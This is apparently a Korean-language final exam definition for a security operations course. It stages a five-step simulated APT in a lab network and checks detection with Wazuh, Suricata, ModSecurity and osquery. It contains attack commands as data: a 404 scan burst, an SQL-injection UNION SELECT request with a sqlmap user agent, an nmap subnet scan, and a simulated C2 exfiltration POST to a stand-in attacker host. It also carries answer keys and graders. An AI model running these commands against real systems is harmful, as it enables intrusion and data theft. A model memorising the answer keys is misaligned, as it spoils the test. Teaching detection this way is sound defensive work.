lab_id: standalone-secuops-week15
title: 기말 — APT 5 단계 종합 시험 (180분, 100점)
version: standalone-non-ai
course: secuops
week: 15
description: |
  K-APT 침투 5 단계 (Reconnaissance / Initial Access / Lateral / C2 / IR 보고) 의
  종합 R/B/P. 5 단계 × 20점 = 100점.
difficulty: hard
duration_minutes: 180
prerequisites: [W14]
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 단계 1 (20점) — Reconnaissance

      attacker 에서 404 burst 50회 → 3 source detection (Wazuh / Suricata / osquery).

      ## 💻 실행 명령

      ```bash
      # Red: 50 burst
      ssh 6v6-attacker 'for i in $(seq 1 50); do
        curl -s -o /dev/null -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"
      done'
      sleep 5

      # Blue: Wazuh 4xx alert (rule 31151)
      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3'

      # Blue: Suricata HTTP event
      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"http\" and .http.status>=400) | {url:.http.url}" 2>/dev/null | tail -3'

      # Blue: osquery curl process count
      ssh 6v6-web 'sudo osqueryi --json "SELECT name, count(*) AS n FROM processes WHERE name LIKE '"'"'%curl%'"'"' GROUP BY name;"'
      ```

      ## 📋 평가 (각 5점)

      1. 50 burst 실행
      2. Wazuh 31151 alert
      3. Suricata 404 status event
      4. osquery 또는 access.log 의 404 흔적
    hint: 50 burst + 3 source detection
    category: exam
    points: 20
    answer: |
      ssh 6v6-attacker 'for i in $(seq 1 50); do curl -s -o /dev/null -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"; done'
      sleep 5
      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3'
      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"http\" and .http.status>=400) | {url:.http.url}" 2>/dev/null | tail -3'
      ssh 6v6-web 'sudo osqueryi --json "SELECT count(*) AS curl_processes FROM processes WHERE name LIKE '"'"'%curl%'"'"';"'
    answer_detail: Recon 단계.
    verify:
      type: output_contains
      expect: '31\|http'
      field: stdout
      semantic:
        intent: Recon detection
        success_criteria: [3 source]
        acceptable_methods: ["**[OSS] ATT&CK T1595 Active Scanning**"]
    target_vm: bastion

  - order: 2
    instruction: |
      ## 🎯 단계 2 (20점) — Initial Access (SQLi 시도)

      sqlmap UA + SQLi payload → ModSec 차단 + Wazuh + Suricata 통합 alert.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=admin+UNION+SELECT+user,pass+FROM+users--"'
      sleep 3
      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]?" 2>/dev/null | grep -oE ''id "[0-9]+"'' | sort -u | head'
      ssh 6v6-siem 'sudo grep "31100\|web" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
      ```

      ## 📋 평가

      1. ModSec 403 + 942 룰 매치
      2. Wazuh 31100 (Apache 4xx) alert
      3. Suricata sqlmap UA detection (등록된 룰이 있으면)
      4. timeline 통합 (3 source 의 timestamp 매칭)
    hint: SQLi 통합
    category: exam
    points: 20
    answer: |
      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=admin+UNION+SELECT+user,pass+FROM+users--"'
      sleep 3
      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]?" 2>/dev/null | grep -oE ''id "[0-9]+"'' | sort -u'
    answer_detail: SQLi 통합 detection.
    verify:
      type: output_contains
      expect: '942\|941'
      field: stdout
      semantic:
        intent: SQLi 통합
        success_criteria: [ModSec + Wazuh]
        acceptable_methods: ["**[OSS] T1190 Exploit Public-Facing Application**"]
    target_vm: bastion

  - order: 3
    instruction: |
      ## 🎯 단계 3 (20점) — Lateral Movement (nmap scan)

      attacker → dmz subnet nmap 스캔 → fw + Suricata detection.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,5601 10.20.32.0/24 2>&1 | tail -15'
      sleep 5
      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"alert\") | {sig:.alert.signature, sid:.alert.signature_id}" 2>/dev/null | tail -5'
      ```

      ## 📋 평가

      1. nmap 실행 + 5+ port 응답
      2. Suricata ET SCAN 룰 매치
      3. fw counter 증가
      4. timeline 분석
    hint: nmap + Suricata
    category: exam
    points: 20
    answer: |
      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,5601 10.20.32.0/24 2>&1 | tail -15'
      sleep 5
      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"alert\") | {sig:.alert.signature}" 2>/dev/null | tail -5'
    answer_detail: Lateral nmap.
    verify:
      type: output_contains
      expect: 'open\|filtered'
      field: stdout
      semantic:
        intent: Lateral detection
        success_criteria: [nmap + Suricata]
        acceptable_methods: ["**[OSS] T1046 Network Service Scanning**"]
    target_vm: bastion

  - order: 4
    instruction: |
      ## 🎯 단계 4 (20점) — C2 / Exfil (CDB list 매치)

      CDB list (W13) 의 IP 로 outbound 시도 → Wazuh CDB 매치 alert.

      ## 💻 실행 명령

      ```bash
      # W13 의 CDB list 가 작성되어 있으면 매치
      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "data=SECRET" -H "Host: c2.attacker.com" "http://1.2.3.4:8080/" -o /dev/null -w "%{http_code}\n" 2>&1'
      sleep 3
      ssh 6v6-siem 'sudo grep -E "100300|1.2.3.4" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
      ```

      ## 📋 평가

      1. outbound 시도
      2. CDB list 매치 시 100300 alert + level 12
      3. Suricata ET CNC 룰 매치 (있다면)
      4. timeline
    hint: C2 outbound + CDB
    category: exam
    points: 20
    answer: |
      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "data=SECRET" "http://1.2.3.4:8080/" -o /dev/null -w "%{http_code}\n" 2>&1'
      sleep 3
      ssh 6v6-siem 'sudo grep -E "100300|1.2.3.4" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
    answer_detail: C2 시뮬.
    verify:
      type: output_contains
      expect: '0\|1.2.3'
      field: stdout
      semantic:
        intent: C2 detection
        success_criteria: [outbound 시도]
        acceptable_methods: ["**[OSS] T1041 Exfiltration over C2**"]
    target_vm: bastion

  - order: 5
    instruction: |
      ## 🎯 단계 5 (20점) — IR 통합 보고서

      위 4 단계 + Coverage Matrix + ATT&CK 매핑 + ISMS-P 매핑 + 운영 권장 5+.

      ## 💻 산출물

      ```markdown
      # K-APT 침투 IR 보고서 (W15 기말, 학번)

      ## Timeline (5 event)
      | t | event | source | detection | rule.id |
      ...

      ## MITRE ATT&CK 매핑
      - T1595 Active Scanning
      - T1190 Exploit Public-Facing
      - T1046 Network Service Scanning
      - T1041 Exfiltration over C2

      ## ISMS-P 2.12 매핑
      - 2.12.1 사고 인지 (4 source alert)
      - 2.12.2 대응 (Active Response)
      - 2.12.3 분석 (3 source timeline)
      - 2.12.4 사후 (Report + IOC 갱신)

      ## 영향 분석 + 운영 권장 5+
      ```
    hint: IR 보고서
    category: exam
    points: 20
    answer: 위 형식
    answer_detail: 종합 IR 보고서.
    verify:
      type: output_contains
      expect: ATT
      field: stdout
      semantic:
        intent: IR 종합
        success_criteria: [Timeline + ATT&CK + ISMS-P]
        acceptable_methods: ["**[관리적]** PTES 7 단계", "**[관리적]** NIST CSF 5 function"]
    target_vm: bastion
